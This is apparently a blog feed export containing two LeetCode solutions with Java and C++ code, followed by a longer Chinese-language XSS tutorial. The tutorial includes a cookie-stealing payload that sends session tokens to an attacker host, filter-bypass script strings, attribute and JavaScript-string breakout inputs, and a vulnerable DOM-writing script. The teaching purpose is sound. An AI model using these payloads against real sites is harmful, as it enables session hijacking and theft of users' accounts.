<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: n = <span class="number">4421</span></span><br><span class="line">Output: <span class="number">21</span></span><br><span class="line">Explanation: </span><br><span class="line">Product of digits = <span class="number">4</span> * <span class="number">4</span> * <span class="number">2</span> * <span class="number">1</span> = <span class="number">32</span> </span><br><span class="line">Sum of digits = <span class="number">4</span> + <span class="number">4</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">11</span> </span><br><span class="line">Result = <span class="number">32</span> - <span class="number">11</span> = <span class="number">21</span></span><br></pre></td></tr></table></figure>

<h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &lt;= n &lt;= <span class="number">10</span>^<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>循环取余，再求和，求积。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> product = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">0</span> != n) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = n % <span class="number">10</span>;</span><br><span class="line">            sum += temp;</span><br><span class="line">            product *= temp;</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product - sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> product = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = n % <span class="number">10</span>;</span><br><span class="line">            sum += temp;</span><br><span class="line">            product *= temp;</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product - sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1365. How Many Numbers Are Smaller Than the Current Number</title>
    <url>/2020/03/02/LeetCode/leetcode-001365.-How-Many-Numbers-Are-Smaller-Than-the-Current-Number/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given the array <code>nums</code>, for each <code>nums[i]</code> find out how many numbers in the array are smaller than it. That is, for each <code>nums[i]</code> you have to count the number of valid <code>j&#39;s</code> such that <code>j != i</code> <strong>and</strong> <code>nums[j] &lt; nums[i]</code>.</p>
<p>Return the answer in an array.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [8,1,2,2,3]</span><br><span class="line">Output: [4,0,1,1,3]</span><br><span class="line">Explanation: </span><br><span class="line">For nums[0]&#x3D;8 there exist four smaller numbers than it (1, 2, 2 and 3). </span><br><span class="line">For nums[1]&#x3D;1 does not exist any smaller number than it.</span><br><span class="line">For nums[2]&#x3D;2 there exist one smaller number than it (1). </span><br><span class="line">For nums[3]&#x3D;2 there exist one smaller number than it (1). </span><br><span class="line">For nums[4]&#x3D;3 there exist three smaller numbers than it (1, 2 and 2).</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">8</span>]</span><br><span class="line">Output: [<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>]</span><br><span class="line">Output: [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> &lt;= nums.length &lt;= <span class="number">500</span></span><br><span class="line"><span class="number">0</span> &lt;= nums[i] &lt;= <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力破解。两次遍历，统计每个比每个数字小的总数即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] smallerNumbersThanCurrent(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    result[i]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.<span class="built_in">size</span>();j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result.emplace_back(count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>从题目的限制条件来看，数字的值最大也只有100.因此，可以申请一个长度为100的数组count，值初始化为0。然后遍历nums，对每个nums[i]，count[nums[i]]位置上的值自增1.</p>
<p>接着，遍历count数组，将count[i]上的值，赋为它前一位以及当前位的和。</p>
<p>最后遍历nums数组，直接将count[muns[i] - 1]位置上的值取出置入结果数组即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] smallerNumbersThanCurrent(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">101</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            count[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; count.length;i++) &#123;</span><br><span class="line">            count[i] += count[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == nums[i]) &#123;</span><br><span class="line">                result[i] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result[i] = count[nums[i]  - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(nums.<span class="built_in">size</span>(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">count</span><span class="params">(<span class="number">101</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            count[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; count.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            count[i] += count[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i]) &#123;</span><br><span class="line">                result[i] = count[nums[i] - <span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result[i] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS攻击</title>
    <url>/2019/04/02/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/6-XSS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><p>跨站点脚本（XSS）是Web应用程序中发现的最为普遍的漏洞，困扰着现在绝大多数的应用程序，包括因特网上一些最为注重安全的应用程序。XSS漏洞表现为各种形式，并且可分为3种类型：反射型、保存型和基于DOM的XSS漏洞。虽然这些漏洞具有一些相同的特点，但在如何确定及利用这些漏洞方面，仍然存在一些重要的差异。</p>
<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>如果一个应用程序使用动态页面向用户显示错误消息，就会造成一种常见的XSS漏洞。通常，该页面会使用一个包含消息文本的参数，并在响应中将这个文本返回给用户。由于利用这种漏洞需要设计一个包含嵌入式JavaScript代码的请求，随后这些代码又被反射到任何提出请求的用户，因此它被称作反射型XSS。攻击有效载荷分别通过一个单独的请求与响应进行传送和执行。为此，有时它也被称为一阶XSS。</p>
<h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><p>利用XSS漏洞攻击应用程序其他用户的方式有很多种。最简单的一种攻击，也是我们常用于说明XSS漏洞潜在影响的一种攻击，可导致攻击者接货通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户经授权访问的所有数据和功能。</p>
<p>实施这种攻击的步骤如图所示。</p>
<ol>
<li><p>用户正常登陆应用程序，得到一个包含会话令牌的cookie：</p>
<p>Set-Cookie: sessid=23123djksdah2132489021213</p>
</li>
<li><p>攻击者通过某种方法向用户提交以下URL:</p>
<p><a href="http://mdsec.net/error/5/Error.ashx?message=" target="_blank" rel="noopener">http://mdsec.net/error/5/Error.ashx?message=</a><script>var+i=new+Image;+i.src="<a href="http://mdattacker.net/&quot;%2bdocument.cookie" target="_blank" rel="noopener">http://mdattacker.net/&quot;%2bdocument.cookie</a>;</script></p>
<p>和前面生成一个对话框消息的示例一样，这个URL包含嵌入式JavaScript的代码。但是这个示例中的攻击有效载荷更加恶毒</p>
</li>
<li><p>用户从应用程序中请求攻击者传送给他们的URL</p>
</li>
<li><p>服务器响应用户的请求。由于应用程序中存在XSS漏洞，响应中包含攻击者创建的JavaScript代码</p>
</li>
<li><p>用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码</p>
</li>
<li><p>攻击者创建的恶意JavaScript代码为：</p>
<p>var i = new Image;i.src=”<a href="http://mdattacker.net/&quot;+document.cookie" target="_blank" rel="noopener">http://mdattacker.net/&quot;+document.cookie</a>;</p>
<p>这段代码可让用户浏览器向mdattacker.net（攻击者拥有的一个域）提出一个请求。请求中包含用户访问应用程序的当前会话令牌：</p>
<p>Get /sessId=23123djksdah2132489021213 HTTP/1.1</p>
<p>Host:mdattacker.net</p>
</li>
<li><p>攻击者监控访问mdattacker.net的请求并收到用户的请求。攻击者使用截获的令牌劫持用户的会话，从而访问该用户的个人信息，并“代表”该用户执行任意操作。</p>
</li>
</ol>
<h2 id="保存型XSS漏洞"><a href="#保存型XSS漏洞" class="headerlink" title="保存型XSS漏洞"></a>保存型XSS漏洞</h2><p>另一种常见的XSS漏洞叫做保存型跨站点脚本。如果一名用户提交的数据被保存在应用程序中（通常保存在一个后端数据库中），然后不经适当过滤或净化就显示给其他用户，此时就会出现这种漏洞。</p>
<p>在支持中断用户交互的应用程序中，或者在具有管理权限的员工访问同一个应用程序中的用户记录和数据的应用程序中，保存型XSS漏洞很常见。</p>
<p>一般情况下，利用保存型XSS漏洞的攻击至少需要向应用程序提出两个要求。攻击者在第一个请求中传送一些专门设计的数据，其中包含恶意代码，应用程序接受并保存这些数据。在第二个请求中，一名受害者查看某个包含攻击者的数据的页面，这时恶意代码开始执行。为此，这种漏洞有时也叫做二阶跨站点脚本。</p>
<p>下图说明了一名攻击者如何利用保存型XSS漏洞，实施删除利用反射性XSS漏洞实施的相同会话劫持攻击。</p>
<p>反射型与保存型XSS攻击在实施步骤上存在两个重要的区别，这也使得后者往往造成更大的安全威胁。</p>
<p>首先，在反射型XSS脚本攻击中，要利用一个漏洞，攻击者必须以某种方式诱使受害者访问他专门设计的URL。而保存型XSS脚本攻击则没有这种要求。在应用程序中展开攻击后，攻击者只需要等待受害者浏览已被攻破的页面或功能。通常，这个页面是一个正常用户将会主动访问的常规页面。</p>
<p>其次，如果受害者在遭受攻击时正在使用应用程序，攻击者就更容易实现其XSS漏洞的目的。例如，如果当前正在进行会话，那么攻击者就可以劫持这个会话。在反射型XSS攻击中，攻击者可能会说服用户登录，然后单击它们提供的一个链接，从而制造这种情况。或者他可能会部署一个永久性的有效载荷并等待用户登录。因为攻击有效载荷被保存在用户自主访问的一个应用程序页面中，所以，当有效载荷执行时，任何攻击受害者都在使用应用程序。而且，如果上述页面位于应用程序通过验证的区域内，那么攻击受害者一定已经登录。</p>
<p>反射型与保存型XSS攻击之间的这些区别意味着保存型XSS漏洞往往会给应用程序带来更严重的安全威胁。许多时候，攻击者可以向应用程序提交一些专门设计的数据，然后等待受害者访问它们。如果其中一名受害者是管理员，那么攻击者就能够完全攻破整个应用程序。</p>
<h2 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h2><p>反射型和保存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据返回给用户。第三类XSS漏洞并不具有这种特点。在这种漏洞中，攻击者的JavaScript通过以下过程得以执行。</p>
<ul>
<li>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript</li>
<li>服务器的响应中并不一定任何形式包含攻击者的脚本</li>
<li>当用户的浏览器处理这个响应时，上述脚本得以处理。</li>
</ul>
<p>由于客户端JavaScript可以访问浏览器的文本对象模型（Document Object Model， DOM），因此它能够决定用于加载当前页面的URL。由应用程序发布的一段脚本可以从URL中提取数据，对这些数据进行处理，然后用它动态更新页面的内容。如果这样，应用程序就可能易于受到基于DOM的XSS攻击。</p>
<p>回到前面的反射型XSS漏洞中的示例，其中服务器端应用程序讲一个URL参数值复制到一条错误消息中。另一种事项相同功能的办法是由应用程序每次返回相同的静态HTML，并使用客户端JavaScript动态生成消息内容。</p>
<p>例如，假设应用程序返回的错误页面包含以下脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> url = <span class="built_in">document</span>.location;</span><br><span class="line">	url = <span class="built_in">unescape</span>(url);</span><br><span class="line">	<span class="keyword">var</span> message = url.substring(url.indexof(<span class="string">'message='</span>) + <span class="number">8</span>, url.length);</span><br><span class="line">	<span class="built_in">document</span>.write(message);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段脚本解析URL，提取出message参数的值，并把这个值写入页面的HTML源代码中。如果按开发者预想的方式调用，它可以和前面的示例中一样，用于创建错误消息。但是，如果攻击者设计出一个URL，并以JavaScript代码作为message参数，那么这段代码将被动态写入页面中，并向服务器返回代码一样得以执行。在这个示例中，前面示例中利用反射型XSS漏洞的同一个URL也可用于生成一个对话框：</p>
<p><a href="http://mdsec.net/error/18/Error.ashx?message=" target="_blank" rel="noopener">http://mdsec.net/error/18/Error.ashx?message=</a><script>alert('xss')</script></p>
<p>利用基于DOM的XSS漏洞如下图所示</p>
<p>与保存型XSS漏洞相比，基于DOM的XSS漏洞与反射型XSS漏洞有更大的相似性。利用它们通常需要攻击者诱使一名用户访问一个包含恶意代码的专门设计的URL，并由服务器响应那个确保恶意代码得以执行的特殊请求。</p>
<h2 id="XSS攻击的传送机制"><a href="#XSS攻击的传送机制" class="headerlink" title="XSS攻击的传送机制"></a>XSS攻击的传送机制</h2><p>确定一个XSS漏洞并设计出利用它的有效载荷后，攻击者需要找出办法向应用程序的其他用户传送攻击。</p>
<h3 id="传送反射型与基于DOM的XSS攻击"><a href="#传送反射型与基于DOM的XSS攻击" class="headerlink" title="传送反射型与基于DOM的XSS攻击"></a>传送反射型与基于DOM的XSS攻击</h3><p>除了通过电子邮件向随机用户发亮发送专门设计的URL这种明显的钓鱼向量外，攻击者还可以尝试使用以下机制传送反射型或基于DOM的XSS攻击。</p>
<ul>
<li><p>在由针对性的攻击者，攻击者可以向个体目标用户或少数几名用户发送一封伪造的电子邮件。如果攻击者想要攻破某个特殊用户的会话（而非截取随机用户的会话），实施合理、可靠的针对性攻击往往是最有效的传送机制。有时，我们会把这类攻击称为“鱼叉式钓鱼”。</p>
</li>
<li><p>可以在即时消息中项目表用户提供一个URL。</p>
</li>
<li><p>第三方Web站点上的内容与代码可用于生成触发XSS漏洞的请求。各种常见的应用程序允许用户发布数量有限的HTML标记，这些标记将按原样向其他用户显示。如果可以使用GET方法触发XSS漏洞，攻击者就可以在第三方站点上发布一个指向某恶意URL的IMG标签，任何查看以上第三方内容的用户将在不知情的情况下请求该恶意URL。</p>
<p>或者，攻击者可以创建自己的Web站点，在其中包含诱使用户访问的有趣内容，但也可能含有一些脚本，导致用户的浏览器向易受攻击的应用程序提出包含XSS有效载荷的请求。如果某用户登录以上易受攻击的应用程序，并且碰巧浏览了攻击者的站点，该用户访问以上易受攻击的应用程序的会话将被攻破。</p>
<p>建立适当的Web站点后，攻击者可以使用搜索引擎操纵技巧生成某些用户提交的访问，例如，将相关关键字放入站点内容中并使用相关表达式将其链接到相关站点。但是，这种传送机制与钓鱼攻击无关，因为攻击者的站点并未试图模仿它所针对的站点。</p>
<p>注意，这种传送机制使得攻击者可利用只通过POST请求触发的反射型与基于dom的XSS漏洞。但是，利用这些漏洞，攻击者明显不能通过向受害用户发送一个简单的URL来传送依次攻击。然而，某个恶意Web站点可能包含一个HTML表单，它使用POST方法并以易受攻击的应用程序作为它的目标URL。其页面上的JavaScript或导航空间可用于提交表单，成功利用漏洞。</p>
</li>
<li><p>在另一种利用第三方Web站点的攻击中，一些攻击者付费购买许多链接至一个URL的横幅广告，该URL包含一个针对某易受攻击的应用程序的XSS有效载荷。</p>
</li>
<li><p>许多应用程序执行一种“推荐给朋友”或向站点管理员发送反馈的功能。</p>
</li>
</ul>
<h3 id="传送保存型XSS攻击"><a href="#传送保存型XSS攻击" class="headerlink" title="传送保存型XSS攻击"></a>传送保存型XSS攻击</h3><p>保存型XSS攻击共有两种传送机制：带内与带外传送机制。</p>
<p>带内传送机制适用于大多数情况，这时漏洞数据通过主Web界面提交给应用程序。用户控制的数据最终显示给其他用户的常见位置包含：</p>
<ul>
<li>个人信息字段，如姓名、地址、电子邮件、电话等；</li>
<li>文档、上传文件及其他数据的名称；</li>
<li>提交给应用程序管理员的反馈或问题；</li>
<li>向其他应用程序用户传送的消息、注释、问题等；</li>
<li>记录在应用程序日志中，并通过浏览器显示给管理员的任何内容，如URL、用户名、HTTP Referer、User-Agent等；</li>
<li>在用户之间共享的上传文件内容。</li>
</ul>
<p>在这些情况下，只需向应用程序页面提交XSS有效载荷，然后等待受害者查看恶意代码，就可以传送XSS有效载荷。</p>
<p>带外传送机制适用于通过其他渠道向应用程序提交漏洞数据情况。应用程序通过这种渠道接收数据，并最终在主Web界面生成的HTML页面中显示它。前面描述的针对Web邮件应用程序的攻击就是这种传送机制的典型示例。这种攻击像一个SMTP服务器传送恶意数据，并最终在一条HTML格式的电子邮件消息中向用户显示这些数据。</p>
<h2 id="查找并利用XSS漏洞"><a href="#查找并利用XSS漏洞" class="headerlink" title="查找并利用XSS漏洞"></a>查找并利用XSS漏洞</h2><p>确定XSS漏洞的基本方法是使用下面这个概念验证攻击字符串：</p>
<p><strong>&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</strong></p>
<p>这个字符串被提交给每个应用程序页面的每一个参数；同时，攻击者监控它的响应，看其中是否出现相同的字符串。如果发现攻击字符串按原样出现在响应中，几乎可以肯定应用存在XSS漏洞。</p>
<p>如果仅仅是为了尽可能地确定应用程序中存在某种XSS漏洞，以向其他应用程序用户实施攻击，那么这个基本方法可能使最为有效的方法，因为它可以实现高度自动化，而且很少生成错误警报。但是，如果是对应用程序进行复杂的测试，从而确定尽可能多的漏洞，那么在应用基本方法的同时，还需要组合使用更加复杂的技巧。在以下几种情况下，通过基本的检测方法可能无法确定应用程序中存在XSS漏洞。</p>
<ul>
<li><p>许多应用程序实施基于黑名单的初步过滤，试图阻止XSS攻击。通常，这些过滤在请求参数中寻找<script>之类的表达式，并采取一些防御措施，如删除或编码表达式，或者完全阻止这类请求。基本检测方法中常用的攻击字符串往往被这些过滤阻止。但是，仅仅因为一个常见的攻击字符串被阻止，并不能证明一个可利用的漏洞不存在。如后文所述，在有些情况下，不使用<script>标签，甚至不使用" < >和/这些常被过滤掉的字符，也可以利用XSS漏洞。</p>
</li>
<li><p>许多应用程序实施的防XSS过滤存在缺陷，可以通过各种方法避开。例如，假设在处理用户输入前，应用程序删除其中出现的所有<script>标签。这意味着基本方法中使用的攻击字符串将不会在应用程序的响应中返回。但是，以下一个或几个字符串可轻易避开过滤，成功利用XSS漏洞：</p>
<p><strong>">&lt;script >alert(document.cookie)&lt;/script ></strong></p>
<p><strong>">&lt;ScRiPt>alert(document.cookie)&lt;/ScRiPt></strong></p>
<p><strong>"%3e%3cscript%3ealert(document.cookie)%3c/script%3e</strong></p>
<p><strong>">&lt;scr&lt;script>ipt>alert(document.cookie)&lt;/scr&lt;script>ipt></strong></p>
<p><strong>%00">&lt;script>alert(document.cookie)&lt;/script></strong></p>
</li>
</ul>
<p>注意，在这些情况下，在服务器的响应中，输入的字符串返回前，可能经过净化、编码或其他形式的修改，因而还不足以实现对XSS漏洞的利用。这时，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
<p>当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器DOM中，并可被客户端JavaScript访问。同样，在这种情况下，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
<h3 id="查找并利用反射型XSS漏洞"><a href="#查找并利用反射型XSS漏洞" class="headerlink" title="查找并利用反射型XSS漏洞"></a>查找并利用反射型XSS漏洞</h3><p>要探查反射型XSS漏洞，最可靠的方法是系统性地检查在解析应用程序过程中确定的所有用户输入进入点，并遵循以下步骤。</p>
<ul>
<li>在每个进入点提交的一个良性字母字符串</li>
<li>确定此字符串“反射”在应用程序响应中的所有位置</li>
<li>对于每个反射，确定显示反射型数据时的语法上下文</li>
<li>提交针对反射的语法上下文而修改的数据，尝试在响应中引入任意脚本</li>
<li>如果反射型数据被阻止或净化，导致脚本无法执行，则尝试了解并避开应用程序的防御性过滤</li>
</ul>
<h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>检测反射型XSS漏洞最可靠的方法的初始步骤与前面描述的方法类似。</p>
<ol>
<li><p>选择任意一个字符串，该字符串不曾出现在应用程序的任何地方，而且其中仅包含字母字符，因此不可能受到针对XSS过滤的影响。例如：</p>
<p><strong>myxsstestdmqlwp</strong></p>
<p>提交这个字符串，以其作为每个页面的每一个参数，且每次只针对一个参数。</p>
</li>
<li><p>监控应用程序的响应，看其中是否出现同一个字符串。记下参数值被复制到应用程序响应中的每一个参数。这些参数不一定容易受到攻击，但需要对它们进行深入分析。</p>
</li>
<li><p>注意，必须测试所有GET与POST请求，检查URL查询字符串与消息主体中的每一个参数。虽然有少数XSS漏洞传送机制只能通过一个POST请求触发，但仍有可能对漏洞加以利用。</p>
</li>
<li><p>任何时候，一旦在POST请求中发现XSS，应使用burp中的“更改请求方法”选项确定是否可以通过GET请求实施相同的攻击</p>
</li>
<li><p>除标准的请求参数外，还应该检测HTTP请求消息头内容被应用程序处理的每一种情况。有一种常见的XSS漏洞出现在错误消息中，这时Referer与User-Agent消息头之类的数据项被复制到消息的内容中。这些消息头是传送反射型XSS攻击的有效工具，因为攻击者可以使用一个Flash对象诱使受害者提出一个包含任意HTTP消息头的请求。</p>
</li>
</ol>
<h4 id="测试引入脚本的反射"><a href="#测试引入脚本的反射" class="headerlink" title="测试引入脚本的反射"></a>测试引入脚本的反射</h4><p>必须手动检查已确定的每一个反射型输实例，已核实其是否可被利用。在响应中包含反射型数据的每个位置，都需要确认该数据的语法特点。这时，必须找到某种修改输入的方法，以便在将输入复制到应用程序响应中的相同位置时，任何脚本都能够得到以执行。下面分析这方面的一些示例。</p>
<h5 id="例1：标签属性值"><a href="#例1：标签属性值" class="headerlink" title="例1：标签属性值"></a>例1：标签属性值</h5><p>假设返回的页面中包含以下脚本：</p>
<p><strong>&lt;input type="text" name="address1" value="mysxxtestdmqlwp"></strong></p>
<p>很明显，利用XSS的一种方法是终止包含字符串的双引号，结束&lt;input>标签，然后通过其他方法引入JavaScript脚本（使用&lt;script>等）。例如：</p>
<p>** " onfocus="alert(1)**</p>
<h5 id="例2：JavaScript字符串"><a href="#例2：JavaScript字符串" class="headerlink" title="例2：JavaScript字符串"></a>例2：JavaScript字符串</h5><p>假设返回的页面包含以下脚本：</p>
<p><strong>&lt;script>var a = 'myxsstestdmqlwp';var b = 123;...&lt;/script></strong></p>
<p>这时受控制的字符串被直接插入到现有的一段脚本中。要利用XSS，可以终止字符串周围的单引号，用一个分号终止整个语句，然后直接处理想要执行的JavaScript。例如：</p>
<p><strong>'; alert(1); var foo='</strong></p>
